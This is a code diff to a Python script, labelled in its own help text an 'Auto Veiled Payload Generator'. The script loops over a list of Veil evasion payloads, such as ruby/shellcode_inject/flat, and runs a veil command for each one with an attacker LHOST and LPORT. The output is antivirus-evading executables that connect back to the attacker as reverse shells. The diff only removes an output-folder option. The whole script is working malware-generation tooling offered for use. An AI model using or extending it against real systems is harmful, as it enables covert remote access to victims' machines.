@@ -39,28 +39,19 @@ payload_list={
               ("ruby/shellcode_inject/flat","compile_to_exe=Y use_arya=Y")
               }
 
-def CreatePayloadCommand(payload_tuple,LHOST,LPORT,path):
+def CreatePayloadCommand(payload_tuple,LHOST,LPORT):
     file_name=payload_tuple[0].split("/")
-    file_name=file_name[len(file_name)-3]+"_"+file_name[len(file_name)-2]+"_"+file_name[len(file_name)-1]+".exe"
+    file_name=file_name[len(file_name)-3]+"_"+file_name[len(file_name)-2]+"_"+file_name[len(file_name)-1]
     return "python "+veil_path+" -p "+payload_tuple[0]+" -c "+payload_tuple[1]+" LHOST="+LHOST+" LPORT="+LPORT+" --overwrite -o "+file_name
     
 parser = argparse.ArgumentParser(description='Auto Veiled Payload Generator')
 parser.add_argument('-LHOST',metavar='[x.x.x.x]',type=str,help='Local IP Address',required=True)
 parser.add_argument('-LPORT',metavar='PORT NO', type=str,help="Port No",required=True)
-parser.add_argument('-o',type=str,metavar='/path/to/outputfile',help='output folder')
 
 
 args = parser.parse_args()
 
-#check output folder
-if args.o is None:
-    path=os.path.expanduser("~/payloads/")
-else:
-    path=args.o
-#create folder
-if not os.path.exists(path):
-    os.makedirs(path)
 
 for payload in payload_list:
-    os.system(CreatePayloadCommand(payload, args.LHOST, args.LPORT, path))
+    os.system(CreatePayloadCommand(payload, args.LHOST, args.LPORT))
     
